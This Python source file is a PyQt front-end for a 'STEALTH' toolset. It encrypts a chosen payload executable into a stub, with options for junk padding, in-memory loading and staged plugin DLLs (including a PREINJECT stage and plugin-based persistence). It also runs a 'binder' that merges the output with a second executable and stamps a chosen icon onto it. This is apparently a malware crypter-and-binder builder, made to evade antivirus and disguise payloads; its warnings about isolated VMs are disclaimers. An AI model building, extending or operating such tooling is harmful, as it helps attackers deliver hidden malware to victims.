#!/usr/bin/env python3
"""PyQt GUI for the STEALTH toolset (frontend only, backend in `stealth_gui_backend.py`)."""
import sys
import os
from pathlib import Path
from functools import partial
import json
from pathlib import Path as _Path
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from PyQt6 import QtWidgets as _QtWidgets, QtCore as _QtCore, QtGui as _QtGui, QtMultimedia as _QtMultimedia  # type: ignore
    from PyQt5 import QtWidgets as _QtWidgets, QtCore as _QtCore, QtGui as _QtGui, QtMultimedia as _QtMultimedia  # type: ignore

from stealth_gui_backend import Backend

# Visible settings file in workspace for predictable persistence
ROOT_DIR = _Path(__file__).resolve().parent.parent
BIN_DIR = ROOT_DIR / 'bin'
DATA_DIR = ROOT_DIR / 'data'
OUTPUT_DIR = BIN_DIR / 'output'
ICON_PATH = ROOT_DIR / 'gui' / 'icon' / 'icon.ico'
SOUND_PATH = ROOT_DIR / 'gui' / 'audio' / 'notification.wav'
SETTINGS_FILE = DATA_DIR / 'stealth_gui_settings.json'

# Try PyQt6 then PyQt5
try:
    from PyQt6 import QtWidgets, QtCore, QtGui, QtMultimedia
    QtSignal = QtCore.pyqtSignal
    using = 'PyQt6'
except Exception:
    try:
        from PyQt5 import QtWidgets, QtCore, QtGui, QtMultimedia  # type: ignore
        QtSignal = QtCore.pyqtSignal
        using = 'PyQt5'
    except Exception:
        print("PyQt5 or PyQt6 is required. Install one (you mentioned PyQt is installed).")
        raise

APP_NAME = "STEALTH GUI"

class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
    def __init__(self):
        super().__init__()
        self.setWindowTitle(APP_NAME)
        self.resize(760, 420)
        try:
            if ICON_PATH.exists():
                self.setWindowIcon(QtGui.QIcon(str(ICON_PATH)))
        except Exception:
            pass
        self.backend = Backend()
        self.backend.line.connect(self._log)
        self.backend.finished_rc.connect(self._on_backend_finished)
        self._pending_plugins_dir = None
        self._pending_binder_cmd = None
        self._last_cmd = None
        self._current_phase = None
        self._output_path = None
        self._binder_output_path = None
        self._icon_path = None
        self._last_plugin_dir = BIN_DIR / 'plugins'
        self._icon_applied_prepack = False
        self._sound = None
        self._init_sound()
        self._build_ui()
        try:
            OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
        except Exception:
            pass
        # Load persistent settings (last paths, plugins, options)
        try:
            self.load_settings()
        except Exception:
            pass

    def _build_ui(self):
        w = QtWidgets.QWidget()
        self.setCentralWidget(w)
        layout = QtWidgets.QVBoxLayout()
        w.setLayout(layout)

        header = QtWidgets.QLabel(f"<h2>{APP_NAME}</h2><small>Modern PyQt front-end — dry-run and safety first</small>")
        layout.addWidget(header)

        form = QtWidgets.QFormLayout()
        self.payload_edit = QtWidgets.QLineEdit()
        self.payload_btn = QtWidgets.QPushButton("Browse...")
        self.payload_btn.clicked.connect(partial(self._pick_file, self.payload_edit))
        payload_h = QtWidgets.QHBoxLayout(); payload_h.addWidget(self.payload_edit); payload_h.addWidget(self.payload_btn)
        form.addRow("Payload:", payload_h)

        self.output_edit = QtWidgets.QLineEdit(str(OUTPUT_DIR / "out_stub.exe"))
        self.output_btn = QtWidgets.QPushButton("Browse...")
        self.output_btn.clicked.connect(partial(self._pick_save, self.output_edit))
        output_h = QtWidgets.QHBoxLayout(); output_h.addWidget(self.output_edit); output_h.addWidget(self.output_btn)
        form.addRow("Output:", output_h)

        self.key_edit = QtWidgets.QLineEdit()
        self.key_edit.setPlaceholderText("Optional hex key (if empty, a random key will be generated)")
        form.addRow("Key (hex):", self.key_edit)

        # Junk size input (MB)
        self.junk_spin = QtWidgets.QSpinBox()
        self.junk_spin.setRange(0, 500)
        self.junk_spin.setValue(0)
        form.addRow("Junk size (MB):", self.junk_spin)

        options_h = QtWidgets.QHBoxLayout()
        self.dry_run_cb = QtWidgets.QCheckBox("Dry run (no execution)")
        # Persistence moved to plugins; GUI no longer shows a persistence checkbox
        self.in_memory_cb = QtWidgets.QCheckBox("Load in-memory (opt-in)")
        self.in_memory_cb.setChecked(True)
        options_h.addWidget(self.dry_run_cb)
        options_h.addWidget(self.in_memory_cb)
        form.addRow("Options:", options_h)

        # Binder options
        self.enable_binder_cb = QtWidgets.QCheckBox("Run binder after build")
        self.binder_exe2_edit = QtWidgets.QLineEdit()
        self.binder_exe2_btn = QtWidgets.QPushButton("Browse...")
        self.binder_exe2_btn.clicked.connect(partial(self._pick_file, self.binder_exe2_edit))
        binder_exe2_h = QtWidgets.QHBoxLayout(); binder_exe2_h.addWidget(self.binder_exe2_edit); binder_exe2_h.addWidget(self.binder_exe2_btn)
        self.binder_output_edit = QtWidgets.QLineEdit(str(OUTPUT_DIR / "out_binder.exe"))
        self.binder_output_btn = QtWidgets.QPushButton("Browse...")
        self.binder_output_btn.clicked.connect(partial(self._pick_save, self.binder_output_edit))
        binder_out_h = QtWidgets.QHBoxLayout(); binder_out_h.addWidget(self.binder_output_edit); binder_out_h.addWidget(self.binder_output_btn)
        self.binder_icon_edit = QtWidgets.QLineEdit()
        self.binder_icon_btn = QtWidgets.QPushButton("Browse...")
        self.binder_icon_btn.clicked.connect(partial(self._pick_file, self.binder_icon_edit))
        binder_icon_h = QtWidgets.QHBoxLayout(); binder_icon_h.addWidget(self.binder_icon_edit); binder_icon_h.addWidget(self.binder_icon_btn)
        form.addRow("Binder: enable", self.enable_binder_cb)
        form.addRow("Binder exe2:", binder_exe2_h)
        form.addRow("Binder output:", binder_out_h)
        form.addRow("Output icon (optional):", binder_icon_h)

        # Plugins UI (select multiple plugin DLLs)
        self.plugins_list = QtWidgets.QListWidget()
        plugins_h = QtWidgets.QHBoxLayout()
        self.add_plugin_btn = QtWidgets.QPushButton("Add Plugin...")
        self.add_plugin_btn.clicked.connect(self._add_plugin)
        self.remove_plugin_btn = QtWidgets.QPushButton("Remove Selected")
        self.remove_plugin_btn.clicked.connect(self._remove_plugin)
        self.plugins_list.itemDoubleClicked.connect(self._edit_plugin_item)
        plugins_h.addWidget(self.add_plugin_btn)
        plugins_h.addWidget(self.remove_plugin_btn)
        form.addRow("Plugins:", self.plugins_list)
        form.addRow("", plugins_h)

        layout.addLayout(form)

        # Buttons
        btn_h = QtWidgets.QHBoxLayout()
        self.run_btn = QtWidgets.QPushButton("Build (crypt & stub)")
        self.run_btn.clicked.connect(self.on_run)
        self.sim_btn = QtWidgets.QPushButton("Simulate (show command)")
        self.sim_btn.clicked.connect(self.on_simulate)
        btn_h.addWidget(self.run_btn)
        btn_h.addWidget(self.sim_btn)
        layout.addLayout(btn_h)

        self.log_model = QtGui.QStandardItemModel(0, 3)
        self.log_model.setHorizontalHeaderLabels(["Time", "Level", "Message"])
        self.log_view = QtWidgets.QTableView()
        self.log_view.setModel(self.log_model)
        header = self.log_view.horizontalHeader()
        if header:
            header.setStretchLastSection(True)
        self.log_view.setSelectionMode(QtWidgets.QAbstractItemView.SelectionMode.ExtendedSelection)
        self.log_view.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
        self.log_view.setEditTriggers(QtWidgets.QAbstractItemView.EditTrigger.NoEditTriggers)
        self.log_view.setContextMenuPolicy(QtCore.Qt.ContextMenuPolicy.CustomContextMenu)
        self.log_view.customContextMenuRequested.connect(self._log_context_menu)
        self.log_view.setMinimumHeight(240)
        layout.addWidget(self.log_view)

        footer = QtWidgets.QLabel("Note: This GUI invokes local executables in bin/. Test safely in an isolated VM.")
        layout.addWidget(footer)

    def _pick_file(self, lineedit):
        p, _ = QtWidgets.QFileDialog.getOpenFileName(self, "Select file", str(Path.cwd()))
        if p:
            lineedit.setText(p)

    def _pick_save(self, lineedit):
        p, _ = QtWidgets.QFileDialog.getSaveFileName(self, "Select output", str(OUTPUT_DIR / "out_stub.exe"))
        if p:
            lineedit.setText(p)

    def _add_plugin(self):
        start_dir = str(self._last_plugin_dir) if self._last_plugin_dir else str(BIN_DIR / "plugins")
        p, _ = QtWidgets.QFileDialog.getOpenFileName(self, "Select plugin DLL", start_dir, "DLL Files (*.dll);;All Files (*)")
        if p:
            # Avoid duplicates
            existing = [self.plugins_list.item(i).text() for i in range(self.plugins_list.count()) if self.plugins_list.item(i)]  # type: ignore[attr-defined]
            if p in existing:
                self._log_warning("Plugin already added")
                return
            try:
                self._last_plugin_dir = Path(p).parent
            except Exception:
                pass
            # Ask for stage and order
            dlg = QtWidgets.QDialog(self)
            dlg.setWindowTitle("Plugin Stage/Order")
            v = QtWidgets.QVBoxLayout(dlg)
            v.addWidget(QtWidgets.QLabel(f"Configure stage/order for plugin: {Path(p).name}"))
            stage_cb = QtWidgets.QComboBox()
            stage_cb.addItems(["PRELAUNCH", "PREINJECT", "POSTLAUNCH", "ONEXIT", "ONFAIL"])
            stage_cb.setCurrentIndex(2)  # default to POSTLAUNCH so UI plugins show after payload
            order_spin = QtWidgets.QSpinBox()
            order_spin.setRange(0, 65535)
            order_spin.setValue(0)
            form = QtWidgets.QFormLayout()
            form.addRow("Stage:", stage_cb)
            form.addRow("Order:", order_spin)
            v.addLayout(form)
            buttons = QtWidgets.QDialogButtonBox(QtWidgets.QDialogButtonBox.StandardButton.Ok | QtWidgets.QDialogButtonBox.StandardButton.Cancel)
            v.addWidget(buttons)
            buttons.accepted.connect(dlg.accept)
            buttons.rejected.connect(dlg.reject)
            if dlg.exec() == QtWidgets.QDialog.DialogCode.Accepted:
                # store real path in UserRole+1, stage/order in UserRole, and display a friendly label
                item = QtWidgets.QListWidgetItem()
                item.setData(QtCore.Qt.ItemDataRole.UserRole, (stage_cb.currentIndex(), order_spin.value()))
                item.setData(QtCore.Qt.ItemDataRole.UserRole + 1, p)
                stage_names = ["PRELAUNCH", "PREINJECT", "POSTLAUNCH", "ONEXIT", "ONFAIL"]
                item.setText(f"{Path(p).name} [{stage_names[stage_cb.currentIndex()]}:{order_spin.value()}]")
                self.plugins_list.addItem(item)
            else:
                self._log_info("Plugin add cancelled")

    def _remove_plugin(self):
        for item in self.plugins_list.selectedItems():
            self.plugins_list.takeItem(self.plugins_list.row(item))

    def _validate_inputs(self):
        payload = Path(self.payload_edit.text() or "")
        out = Path(self.output_edit.text() or "")
        if not payload.exists() or not payload.is_file():
            self._log_error("Payload path invalid or missing")
            return None
        if not out.parent.exists():
            try:
                out.parent.mkdir(parents=True, exist_ok=True)
            except Exception as e:
                self._log_error(f"Cannot create output directory: {e}")
                return None
        return payload, out

    def _confirm_action(self):
        # Confirm with a checkbox (safety gating)
        dlg = QtWidgets.QDialog(self)
        dlg.setWindowTitle("Confirm Operation")
        v = QtWidgets.QVBoxLayout(dlg)
        v.addWidget(QtWidgets.QLabel("This will run local build tools that may create persistence or execute payloads.\nOnly proceed inside an isolated test VM.\nDo you understand and want to continue?"))
        cb = QtWidgets.QCheckBox("I understand and will test in an isolated environment")
        v.addWidget(cb)
        buttons = QtWidgets.QDialogButtonBox(QtWidgets.QDialogButtonBox.StandardButton.Ok | QtWidgets.QDialogButtonBox.StandardButton.Cancel)
        v.addWidget(buttons)
        buttons.accepted.connect(dlg.accept)
        buttons.rejected.connect(dlg.reject)
        res = dlg.exec()
        return res == QtWidgets.QDialog.DialogCode.Accepted and cb.isChecked()

    def _build_command(self):
        validated = self._validate_inputs()
        if not validated:
            return None
        payload, out = validated
        self._output_path = out
        self._binder_output_path = None
        icon_text = (self.binder_icon_edit.text() or '').strip()
        # If blank, skip icon stamping entirely; otherwise use user selection
        if icon_text:
            try:
                icon_path = Path(icon_text).expanduser().resolve()
                if not icon_path.exists():
                    self._log_warning(f"Icon not found: {icon_path}")
                    icon_path = None
            except Exception as exc:
                self._log_warning(f"Icon path invalid: {exc}")
                icon_path = None
            self._icon_path = icon_path
        else:
            self._icon_path = None
        try:
            cmd, key_used, generated = self.backend.build_command(
                payload,
                out,
                self.key_edit.text(),
                self.junk_spin.value(),
                self.in_memory_cb.isChecked(),
                log_fn=self._log_info,
                warn_fn=self._log_warning,
            )
        except ValueError as e:
            self._log_error(str(e))
            return None
        binder_cmd = None
        if self.enable_binder_cb.isChecked():
            binder_out = Path(self.binder_output_edit.text() or str(OUTPUT_DIR / "out_binder.exe"))
            self._binder_output_path = binder_out
            exe2_text = self.binder_exe2_edit.text() or ''
            try:
                binder_cmd = self.backend.build_binder_command(
                    out,
                    exe2_text,
                    str(binder_out),
                    name1=out.name,
                    name2=Path(exe2_text).name if exe2_text else '',
                    icon_path=icon_text,
                    warn_fn=self._log_warning,
                )
            except Exception as exc:
                self._log_error(str(exc))
                return None
        if generated:
            try:
                self.key_edit.setText(key_used)
            except Exception:
                pass
        return (cmd, binder_cmd)

    def load_settings(self):
        # Prefer explicit JSON settings file in workspace for easier testing/debugging
        try:
            if SETTINGS_FILE.exists():
                with open(SETTINGS_FILE, 'r', encoding='utf-8') as fh:
                    data = json.load(fh)
                payload = data.get('payload')
                output = data.get('output')
                junk = data.get('junk', 0)
                in_memory = data.get('in_memory', True)
                plugins = data.get('plugins', [])
                plugins_dir = data.get('plugins_dir')
                binder_exe2 = data.get('binder_exe2')
                binder_output = data.get('binder_output')
                binder_icon = data.get('binder_icon')
                binder_enabled = data.get('binder_enabled', False)
                if payload:
                    self.payload_edit.setText(payload)
                if output:
                    self.output_edit.setText(output)
                if binder_exe2:
                    self.binder_exe2_edit.setText(binder_exe2)
                if binder_output:
                    self.binder_output_edit.setText(binder_output)
                if binder_icon:
                    self.binder_icon_edit.setText(binder_icon)
                if plugins_dir:
                    try:
                        self._last_plugin_dir = Path(plugins_dir)
                    except Exception:
                        pass
                try:
                    self.enable_binder_cb.setChecked(bool(binder_enabled))
                except Exception:
                    pass
                try:
                    self.junk_spin.setValue(int(junk))
                except Exception:
                    pass
                try:
                    self.in_memory_cb.setChecked(bool(in_memory))
                except Exception:
                    pass
                if plugins:
                    stage_names = ["PRELAUNCH", "PREINJECT", "POSTLAUNCH", "ONEXIT", "ONFAIL"]
                    for it in plugins:
                        p = it.get('path')
                        stage = int(it.get('stage', 0))
                        order = int(it.get('order', 0))
                        if not p:
                            continue
                        resolved = self._resolve_plugin_path(p)
                        item = QtWidgets.QListWidgetItem()
                        item.setData(QtCore.Qt.ItemDataRole.UserRole, (stage, order))
                        item.setData(QtCore.Qt.ItemDataRole.UserRole + 1, str(resolved))
                        item.setText(f"{Path(resolved).name} [{stage_names[stage]}:{order}]")
                        self.plugins_list.addItem(item)
                return
        except Exception:
            pass
        # Fallback to QSettings if JSON file not present
        try:
            settings = QtCore.QSettings('STEALTH', 'GUI')
            payload = settings.value('payload', type=str)
            output = settings.value('output', type=str)
            junk = settings.value('junk', 0, type=int)
            in_memory = settings.value('in_memory', True, type=bool)
            plugins_json = settings.value('plugins', '', type=str)
            plugins_dir = settings.value('plugins_dir', type=str)
            binder_exe2 = settings.value('binder_exe2', type=str)
            binder_output = settings.value('binder_output', type=str)
            binder_icon = settings.value('binder_icon', type=str)
            binder_enabled = settings.value('binder_enabled', False, type=bool)
            if payload:
                self.payload_edit.setText(payload)
            if output:
                self.output_edit.setText(output)
            if binder_exe2:
                self.binder_exe2_edit.setText(binder_exe2)
            if binder_output:
                self.binder_output_edit.setText(binder_output)
            if binder_icon:
                self.binder_icon_edit.setText(binder_icon)
            if plugins_dir:
                try:
                    self._last_plugin_dir = Path(plugins_dir)
                except Exception:
                    pass
            try:
                self.enable_binder_cb.setChecked(bool(binder_enabled))
            except Exception:
                pass
            try:
                self.junk_spin.setValue(int(junk))
            except Exception:
                pass
            try:
                self.in_memory_cb.setChecked(bool(in_memory))
            except Exception:
                pass
            if plugins_json:
                try:
                    items = json.loads(plugins_json)
                    stage_names = ["PRELAUNCH", "PREINJECT", "POSTLAUNCH", "ONEXIT", "ONFAIL"]
                    for it in items:
                        p = it.get('path')
                        stage = int(it.get('stage', 0))
                        order = int(it.get('order', 0))
                        if not p:
                            continue
                        resolved = self._resolve_plugin_path(p)
                        item = QtWidgets.QListWidgetItem()
                        item.setData(QtCore.Qt.ItemDataRole.UserRole, (stage, order))
                        item.setData(QtCore.Qt.ItemDataRole.UserRole + 1, str(resolved))
                        item.setText(f"{Path(resolved).name} [{stage_names[stage]}:{order}]")
                        self.plugins_list.addItem(item)
                except Exception:
                    pass
        except Exception:
            pass

    def save_settings(self):
        # Save explicit JSON file for easier inspection and predictability
        try:
            data = {
                'payload': self.payload_edit.text(),
                'output': self.output_edit.text(),
                'junk': int(self.junk_spin.value()),
                'in_memory': bool(self.in_memory_cb.isChecked()),
                'plugins': [],
                'binder_exe2': self.binder_exe2_edit.text(),
                'binder_output': self.binder_output_edit.text(),
                'binder_icon': self.binder_icon_edit.text(),
                'binder_enabled': bool(self.enable_binder_cb.isChecked()),
            }
            for i in range(self.plugins_list.count()):
                it = self.plugins_list.item(i)
                if not it:
                    continue
                data_role = it.data(QtCore.Qt.ItemDataRole.UserRole) or (0, 0)
                stored = it.data(QtCore.Qt.ItemDataRole.UserRole + 1) or ''
                data['plugins'].append({'path': stored, 'stage': int(data_role[0]), 'order': int(data_role[1])})
            data['plugins_dir'] = str(self._last_plugin_dir) if self._last_plugin_dir else ''
            with open(SETTINGS_FILE, 'w', encoding='utf-8') as fh:
                json.dump(data, fh, indent=2)
            return
        except Exception:
            pass
        # Fallback to QSettings if file save fails
        try:
            settings = QtCore.QSettings('STEALTH', 'GUI')
            settings.setValue('payload', self.payload_edit.text())
            settings.setValue('output', self.output_edit.text())
            settings.setValue('junk', int(self.junk_spin.value()))
            settings.setValue('in_memory', bool(self.in_memory_cb.isChecked()))
            settings.setValue('binder_exe2', self.binder_exe2_edit.text())
            settings.setValue('binder_output', self.binder_output_edit.text())
            settings.setValue('binder_icon', self.binder_icon_edit.text())
            settings.setValue('binder_enabled', bool(self.enable_binder_cb.isChecked()))
            settings.setValue('plugins_dir', str(self._last_plugin_dir) if self._last_plugin_dir else '')
            items = []
            for i in range(self.plugins_list.count()):
                it = self.plugins_list.item(i)
                if not it:
                    continue
                data_role = it.data(QtCore.Qt.ItemDataRole.UserRole) or (0, 0)
                stored = it.data(QtCore.Qt.ItemDataRole.UserRole + 1) or ''
                items.append({'path': stored, 'stage': int(data_role[0]), 'order': int(data_role[1])})
            settings.setValue('plugins', json.dumps(items))
        except Exception:
            pass

    def closeEvent(self, event):
        try:
            self.save_settings()
        except Exception:
            pass
        return super().closeEvent(event)

    def _collect_plugin_entries(self):
        entries = []
        for i in range(self.plugins_list.count()):
            item = self.plugins_list.item(i)
            if not item:
                continue
            stage, order = item.data(QtCore.Qt.ItemDataRole.UserRole) or (0, 0)
            stored = item.data(QtCore.Qt.ItemDataRole.UserRole + 1) or ''
            entries.append({'path': stored, 'stage': int(stage), 'order': int(order)})
        return entries

    def _edit_plugin_item(self, item):
        # Edit stage/order for an existing item
        if not item: return
        stored = item.data(QtCore.Qt.ItemDataRole.UserRole + 1)
        if stored:
            path = Path(stored)
        else:
            path = Path(item.text())
        dlg = QtWidgets.QDialog(self)
        dlg.setWindowTitle("Edit Plugin Stage/Order")
        v = QtWidgets.QVBoxLayout(dlg)
        v.addWidget(QtWidgets.QLabel(f"Edit plugin: {path.name}"))
        stage_cb = QtWidgets.QComboBox()
        stage_cb.addItems(["PRELAUNCH", "PREINJECT", "POSTLAUNCH", "ONEXIT", "ONFAIL"])
        order_spin = QtWidgets.QSpinBox()
        order_spin.setRange(0, 65535)
        data = item.data(QtCore.Qt.ItemDataRole.UserRole)
        if data:
            stage_cb.setCurrentIndex(data[0])
            order_spin.setValue(data[1])
        form = QtWidgets.QFormLayout()
        form.addRow("Stage:", stage_cb)
        form.addRow("Order:", order_spin)
        v.addLayout(form)
        buttons = QtWidgets.QDialogButtonBox(QtWidgets.QDialogButtonBox.StandardButton.Ok | QtWidgets.QDialogButtonBox.StandardButton.Cancel)
        v.addWidget(buttons)
        buttons.accepted.connect(dlg.accept)
        buttons.rejected.connect(dlg.reject)
        if dlg.exec() == QtWidgets.QDialog.DialogCode.Accepted:
            item.setData(QtCore.Qt.ItemDataRole.UserRole, (stage_cb.currentIndex(), order_spin.value()))
            stage_names = ["PRELAUNCH", "PREINJECT", "POSTLAUNCH", "ONEXIT", "ONFAIL"]
            item.setText(f"{path.name} [{stage_names[stage_cb.currentIndex()]}:{order_spin.value()}]")

    def _resolve_plugin_path(self, saved_path):
        """Try to relocate a saved plugin path if it was moved. Prefers current plugin dir."""
        try:
            cand = Path(saved_path)
        except Exception:
            return saved_path
        if cand.exists():
            return cand
        name = cand.name
        search_bases = []
        if self._last_plugin_dir:
            search_bases.append(self._last_plugin_dir)
        search_bases.append(BIN_DIR / 'plugins')
        search_bases.append(ROOT_DIR / 'plugins')
        for base in search_bases:
            if not base:
                continue
            candidate = base / name
            if candidate.exists():
                try:
                    self._last_plugin_dir = base
                except Exception:
                    pass
                return candidate
        return cand

    def on_simulate(self):
        res = self._build_command()
        if not res:
            return
        pack_cmd, binder_cmd = res
        self._log_info("Simulated command:")
        self._log_info(' '.join(f'"{c}"' for c in pack_cmd))
        if binder_cmd:
            self._log_info(' '.join(f'"{c}"' for c in binder_cmd))

    def on_run(self):
        if not self._confirm_action():
            self._log_warning("Operation cancelled by user")
            return
        res = self._build_command()
        if not res:
            return
        pack_cmd, binder_cmd = res
        if self.dry_run_cb.isChecked():
            self._log_info("Dry run enabled — no external commands will be executed")
            self._log_info(' '.join(pack_cmd))
            if binder_cmd:
                self._log_info(' '.join(binder_cmd))
            return
        # Ensure `stub.exe` exists and warn if missing (we embed whatever `stub.exe` is present)
        stub_path = BIN_DIR / 'stub.exe'
        if not stub_path.exists():
            self._log_error(f"`{stub_path}` not found — build it first (GUI build aborted).")
            return

        entries = self._collect_plugin_entries()

        # Prepare an iconized stub BEFORE running the packer so the overlay stays intact.
        self._icon_applied_prepack = False
        icon_stub_path = None
        if self._icon_path:
            try:
                icon_stub_path = self.backend.prepare_iconized_stub(self._icon_path, log_fn=self._log_info, warn_fn=self._log_warning)
                if icon_stub_path:
                    self._icon_applied_prepack = True
            except Exception as exc:
                self._log_warning(f"Icon prep failed; continuing without icon: {exc}")

        plugins_temp_dir, copied = self.backend.stage_plugins(entries, log_fn=self._log_info, warn_fn=self._log_warning)
        if entries and not copied:
            self._log_error("Plugins were selected but none were staged (missing files?). Build aborted.")
            return

        self._pending_plugins_dir = plugins_temp_dir
        self._pending_binder_cmd = binder_cmd
        self._last_cmd = pack_cmd
        self._current_phase = 'packer'
        self._log_info("Starting packer in background...")
        self._log_info(' '.join(f'"{c}"' for c in pack_cmd))
        self.run_btn.setEnabled(False)
        self.sim_btn.setEnabled(False)
        # Keep default plugin scan enabled when no explicit plugin dir is set
        disable_default_plugins = False
        if plugins_temp_dir is None and not entries:
            self._log_info("No plugins staged; relying on default plugin directory scan (plugins\\*.dll relative to bin)")
        self.backend.start_process(pack_cmd, plugin_dir=plugins_temp_dir, disable_plugins_default=disable_default_plugins, workdir=str(BIN_DIR), icon_stub_override=icon_stub_path)

    def _apply_icon_if_requested(self, target_path, label):
        if not self._icon_path or not target_path:
            return
        try:
            self.backend.apply_icon(target_path, self._icon_path, log_fn=self._log_info, warn_fn=self._log_warning)
        except Exception as exc:
            self._log_warning(f"Icon apply failed for {label}: {exc}")

    def _collect_logs(self, pid, payload_out):
        # Read plugin and debug logs from %TEMP% and append tail to GUI log
        temp_dir = Path(os.getenv('TEMP') or os.getenv('TMP') or '.')
        plugin_log = temp_dir / 'stealth_plugin.log'
        debug_log = temp_dir / 'stealth_debug.log'
        for f in (plugin_log, debug_log):
            if f.exists():
                try:
                    with open(f, 'r', encoding='utf-8', errors='ignore') as fh:
                        lines = fh.read().splitlines()
                        tail = lines[-200:]
                        self._log_info(f"=== {f.name} (last {len(tail)} lines) ===")
                        for ln in tail:
                            self._log(ln)
                except Exception as e:
                    self._log_warning(f"Could not read {f}: {e}")

    def _on_backend_finished(self, rc):
        started_binder = False
        try:
            if isinstance(rc, int) and rc >= 0:
                u32 = rc & 0xFFFFFFFF if isinstance(rc, int) else rc
                if isinstance(u32, int) and u32 >= 0x80000000:
                    status_map = {
                        0xC0000005: 'STATUS_ACCESS_VIOLATION',
                        0xC0000374: 'STATUS_HEAP_CORRUPTION',
                        0xC0000008: 'STATUS_INVALID_HANDLE',
                        0xC0000096: 'STATUS_ILLEGAL_INSTRUCTION'
                    }
                    human = status_map.get(u32)
                    if human:
                        self._log_error(f"Process exited with NTSTATUS {hex(u32)} ({human})")
                    else:
                        self._log_error(f"Process exited with NTSTATUS {hex(u32)}")
                    self._log_error("This usually indicates a crash in the child process (heap corruption, access violation, etc.). Try running the executable directly in a debugger or a console to capture more details.")
                    self._pending_binder_cmd = None
                else:
                    if rc != 0:
                        self._log_error(f"Process exited: {rc}")
                        if self._current_phase == 'packer':
                            self._log_error("Cryptor failed — aborting")
                            self._pending_binder_cmd = None
                        elif self._current_phase == 'binder':
                            self._log_error("Binder failed — aborting")
                    else:
                        self._log_info(f"Process exited: {rc}")
                        if self._current_phase == 'packer':
                            # Icon already applied pre-pack if requested; do not patch post-pack to avoid stripping overlay
                            if self._pending_binder_cmd:
                                cmd = self._pending_binder_cmd
                                self._pending_binder_cmd = None
                                self._current_phase = 'binder'
                                self._log_info("Starting binder step…")
                                worker = self.backend.start_process(cmd, plugin_dir=None, disable_plugins_default=True, workdir=str(BIN_DIR))
                                if worker:
                                    started_binder = True
                                    return
                            else:
                                self._play_success_sound()
                        elif self._current_phase == 'binder':
                            self._apply_icon_if_requested(self._binder_output_path, "binder output")
                            self._play_success_sound()
            else:
                self._log_error(f"Cryptor failed — aborting (rc={rc})")
                self._pending_binder_cmd = None
        finally:
            try:
                self.backend.cleanup_plugins(self._pending_plugins_dir)
            except Exception:
                pass
            self._pending_plugins_dir = None
            try:
                self.run_btn.setEnabled(True)
                self.sim_btn.setEnabled(True)
            except Exception:
                pass
            self._last_cmd = None
            if not started_binder:
                self._current_phase = None

    def _append_log_row(self, level, message):
        ts = QtCore.QDateTime.currentDateTime().toString("HH:mm:ss")
        items = [QtGui.QStandardItem(ts), QtGui.QStandardItem(level), QtGui.QStandardItem(message)]
        for it in items:
            it.setEditable(False)
        self.log_model.appendRow(items)
        self.log_view.scrollToBottom()

    def _log_context_menu(self, pos):
        menu = QtWidgets.QMenu(self)
        copy_action = menu.addAction("Copy all rows")
        clear_action = menu.addAction("Clear log")
        viewport = self.log_view.viewport()
        action = menu.exec(viewport.mapToGlobal(pos) if viewport else QtCore.QPoint())
        if action == copy_action:
            self._copy_log_selection()
        elif action == clear_action:
            self.log_model.removeRows(0, self.log_model.rowCount())

    def _copy_log_selection(self):
        selection = self.log_view.selectionModel()
        rows = list(range(self.log_model.rowCount()))
        lines = []
        for r in rows:
            cols = []
            for c in range(self.log_model.columnCount()):
                item = self.log_model.item(r, c)
                cols.append(item.text() if item else "")
            lines.append("\t".join(cols))
        cb = QtWidgets.QApplication.clipboard()
        if cb:
            cb.setText("\n".join(lines))

    def _log(self, s):
        level = "INFO"
        msg = s
        if s.startswith("[ERR]"):
            level = "ERROR"
            msg = s[5:]
        elif s.startswith("[ERROR]"):
            level = "ERROR"
            msg = s[7:]
        elif s.startswith("[WARN]"):
            level = "WARN"
            msg = s[6:]
        elif s.startswith("[INFO]"):
            level = "INFO"
            msg = s[6:]
        self._append_log_row(level, msg)

    def _log_info(self, s):
        self._append_log_row("INFO", s)

    def _log_warning(self, s):
        self._append_log_row("WARN", s)

    def _log_error(self, s):
        self._append_log_row("ERROR", s)

    def _init_sound(self):
        try:
            if not SOUND_PATH.exists():
                return
            effect = QtMultimedia.QSoundEffect()
            effect.setSource(QtCore.QUrl.fromLocalFile(str(SOUND_PATH)))
            effect.setLoopCount(1)
            effect.setVolume(0.5)
            self._sound = effect
        except Exception:
            self._sound = None

    def _play_success_sound(self):
        if not self._sound:
            return
        try:
            self._sound.stop()
            self._sound.play()
        except Exception:
            pass


def main():
    app = QtWidgets.QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())

if __name__ == '__main__':
    main()
